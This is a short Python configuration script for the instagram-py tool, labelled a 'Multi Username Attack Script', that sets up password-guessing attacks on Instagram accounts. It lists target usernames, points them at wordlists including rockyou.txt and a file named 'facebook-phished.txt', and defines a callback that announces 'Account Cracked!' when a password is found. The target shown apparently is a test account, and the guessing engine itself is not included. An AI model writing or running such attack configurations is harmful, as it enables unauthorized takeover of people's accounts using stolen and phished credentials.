#!/usr/bin/instagram-py -s
# Only Supports Python 3

import os

def hacked_an_account(username , password):
    # Use Twilio API to Make a Message to our phone MayBe?
    print("Account Cracked!")
    return True


print("Initiating Multi Username Attack Script...")

global_callback = hacked_an_account
global_password_list = "{}/Developer/.exploits/facebook-phished.txt".format(os.path.expanduser('~'))

usernames = [ # Reserved Variable
                {
                    "id" : "instatestgod__",
                    "password_list" : "/home/antonyjr/Developer/.exploits/rockyou.txt" , # full path
                    "countinue" : True, # Optional
                    "verbose" : 0 # Optional
                },
                # If you want to simultaniously attack the same account with different wordlist
                # Apparently Saving does not work here if two wordlist are used on a single user!
                # could be later fixed anyways...
                {
                    "id" : "instatestgod__",
                    # global password list will cover us if password list is not mentioned!
                    "countinue" : False, # Optional
                    "verbose" : 3 # Optional
                }
                # ,
                # {
                    # "id" : "even_more_users",
                    # "password_list" : "different_passwords.lst",
                # }
]
# Attack Automatically starts here!
